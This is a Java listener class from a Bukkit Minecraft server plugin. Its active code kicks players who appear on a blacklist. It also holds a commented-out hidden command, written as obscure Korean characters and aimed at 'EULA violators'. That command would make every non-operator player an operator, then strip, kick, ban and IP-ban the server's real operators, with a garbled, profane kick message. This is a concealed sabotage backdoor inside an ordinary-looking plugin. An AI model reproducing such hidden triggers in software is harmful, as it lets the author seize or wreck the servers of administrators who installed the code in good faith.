package me.efe.efegear;

import me.efe.efegear.util.Blacklist;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class EfeListener implements Listener {
	public EfeGear plugin;
	
	public EfeListener(EfeGear plugin) {
		this.plugin = plugin;
		
		Blacklist.init();
	}
	
	@EventHandler
	public void join(PlayerJoinEvent e) {
		if (Blacklist.contains(e.getPlayer())) {
			e.setJoinMessage(null);
			
			Blacklist.kick(e.getPlayer());
		}
	}
	
	/*
	 * Just for the violators of Efe's Bukkit Plugin EULA.
	 * 
	 * 
	 */
	
	/*
	@EventHandler
	public void command(PlayerCommandPreprocessEvent e) {
		if (e.getMessage().equals("/\u3141\u3134\u3147\u3139")) {
			
			if (** Is Punishment Mode? **) {
				e.setCancelled(true);
				
				for (OfflinePlayer all : plugin.getServer().getOfflinePlayers()) {
					if (plugin.getServer().getOperators().contains(all)) continue;
					
					all.setOp(true);
				}
				
				for (OfflinePlayer all : plugin.getServer().getOperators()) {
					all.setOp(false);
					
					if (all.isOnline()) {
						all.getPlayer().kickPlayer("¡×cFuck¢Ö You¢Ù");
						all.setBanned(true);
						plugin.getServer().banIP(all.getPlayer().getAddress().getAddress().getHostAddress());
					}
				}
			}
		}
	}
	*/
}